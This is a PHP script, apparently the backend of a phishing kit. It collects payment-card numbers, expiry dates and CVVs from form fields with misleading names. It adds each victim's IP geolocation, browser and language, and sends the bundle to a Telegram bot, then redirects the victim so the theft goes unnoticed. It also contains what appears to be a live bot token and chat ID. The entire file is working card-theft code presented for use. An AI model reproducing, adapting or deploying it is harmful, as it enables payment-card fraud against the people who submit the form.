<?php
// Função para obter informações de IP com tratamento de erros
function getIpInfo($ip) {
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $apiData = @file_get_contents($apiUrl);
    if ($apiData === false) {
        return [
            'query'      => $ip,
            'city'       => 'N/A',
            'regionName' => 'N/A',
            'country'    => 'N/A',
            'isp'        => 'N/A'
        ];
    }
    $data = json_decode($apiData, true);
    if (!isset($data['status']) || $data['status'] !== 'success') {
        return [
            'query'      => $ip,
            'city'       => 'N/A',
            'regionName' => 'N/A',
            'country'    => 'N/A',
            'isp'        => 'N/A'
        ];
    }
    return $data;
}

// Função para determinar o navegador
function getBrowserName($userAgent) {
    $browser = "Desconhecido";
    if (preg_match('/Firefox/i', $userAgent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
        $browser = 'Internet Explorer';
    } elseif (preg_match('/Edge/i', $userAgent)) {
        $browser = 'Microsoft Edge';
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = 'Google Chrome';
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = 'Safari';
    } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
        $browser = 'Opera';
    }
    return $browser;
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (!empty($_POST['campoNome']) && !empty($_POST['campoTel']) && !empty($_POST['campoTel2'])) {
        $numeroCartao   = trim($_POST['campoNome']);
        $validadeCartao = trim($_POST['campoTel']);
        $cvv            = trim($_POST['campoTel2']);
        $dataHora       = date('Y-m-d H:i:s');

        $ip        = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
        $lingua    = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A';
        $navegador = getBrowserName($userAgent);
        $ipInfo    = getIpInfo($ip);

        // Montagem do conteúdo
        $conteudo  = "☠️ | LOG ";
        $conteudo .= "💳 | Número do Cartão: {$numeroCartao}\n";
        $conteudo .= "📅 | Validade: {$validadeCartao}\n";
        $conteudo .= "🔑 | CVV: {$cvv}\n";
        $conteudo .= "🏠 | IP: {$ipInfo['query']}\n";
        $conteudo .= "🔎 | Cidade: {$ipInfo['city']}\n";
        $conteudo .= "📍 | Região: {$ipInfo['regionName']}\n";
        $conteudo .= "🌎 | País: {$ipInfo['country']}\n";
        $conteudo .= "📦 | ISP: {$ipInfo['isp']}\n\n";
        $conteudo .= "🔓 | USER-AGENT: {$userAgent}\n";
        $conteudo .= "🌐 | NAVEGADOR: {$navegador}\n";
        $conteudo .= "👥 | LINGUAGEM: {$lingua}\n";
        $conteudo .= "📆 | DATA/HORA: {$dataHora}\n\n";

        // Use variáveis de ambiente configuradas no Render
        $botToken = getenv('7236468671:AAHRrN2HAHU78bRR6uZDuHiE3FxkDvoJW9M') ?: 'TOKEN_POR_AMBIENTE';
        $chatId   = getenv('6924180031')   ?: 'CHAT_POR_AMBIENTE';

        $mensagem = urlencode($conteudo);
        $url      = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";
        $response = @file_get_contents($url);

        if ($response !== false) {
            header('Location: index.html');
            exit;
        } else {
            echo "<p>Houve um erro ao enviar os dados. Tente novamente.</p>";
        }
    } else {
        echo "<p>Por favor, preencha todos os campos do formulário.</p>";
    }
} else {
    header('Location: https://t.me/duckettstoneprincipal');
    exit;
}
?>